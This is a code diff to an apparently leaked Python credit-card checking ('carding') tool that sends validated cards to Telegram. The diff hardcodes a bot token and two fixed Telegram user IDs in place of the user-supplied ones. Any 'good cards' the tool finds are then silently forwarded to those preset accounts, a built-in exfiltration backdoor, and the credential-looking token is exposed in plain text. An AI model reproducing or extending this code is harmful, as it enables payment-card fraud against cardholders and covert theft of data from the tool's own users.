@@ -15,8 +15,8 @@ RESET = "\033[0m"
 # Global variables
 use_proxy = False
 proxies = []
-bot_token = None
-user_id = None
+bot_token = '7801446284:AAEVqjQPWl6a0NXXCAGdfl6Mw-Fg0PXmB8U'
+user_ids = [6663845789,6698364560]
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -66,7 +66,7 @@ LEAKED BY PROPAGANDA
 def print_menu():
     print(f"{GREEN}[+] Start Card CHK Herokux [1]{RESET}")
     print(f"{GREEN}[+] Toggle Proxy [2]{RESET}")
-    print(f"{GREEN}[+] Set Telegram Bot [3]{RESET}")
+    print(f"{GREEN}[+] Add Telegram User ID [3]{RESET}")
     print(f"\n{GREEN}Please select any option: {RESET}", end="")
 
 def toggle_proxy():
@@ -86,20 +86,24 @@ def toggle_proxy():
         print("I will not use proxy!")
     time.sleep(2)
 
-def set_telegram_bot():
-    global bot_token, user_id
-    bot_token = input("Please enter your Telegram Bot Token: ")
-    user_id = input("Please enter your User ID: ")
-    print("Success! I will send good cards to the bot.")
+def add_telegram_user_id():
+    global user_ids
+    user_id = input("Please enter your Telegram User ID: ")
+    if user_id not in user_ids:
+        user_ids.append(user_id)
+        print(f"User ID {user_id} added successfully!")
+    else:
+        print(f"User ID {user_id} is already in the list.")
     time.sleep(2)
 
 def send_to_telegram(message):
-    if bot_token and user_id:
+    if bot_token and user_ids:
         bot = telebot.TeleBot(bot_token)
-        try:
-            bot.send_message(user_id, message)
-        except Exception as e:
-            print(f"Failed to send message to Telegram: {str(e)}")
+        for user_id in user_ids:
+            try:
+                bot.send_message(user_id, message)
+            except Exception as e:
+                print(f"Failed to send message to {user_id}: {str(e)}")
 
 import warnings
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -229,7 +233,7 @@ def main():
             elif choice == '2':
                 toggle_proxy()
             elif choice == '3':
-                set_telegram_bot()
+                add_telegram_user_id()
             else:
                 print("Invalid option. Please try again.")
 
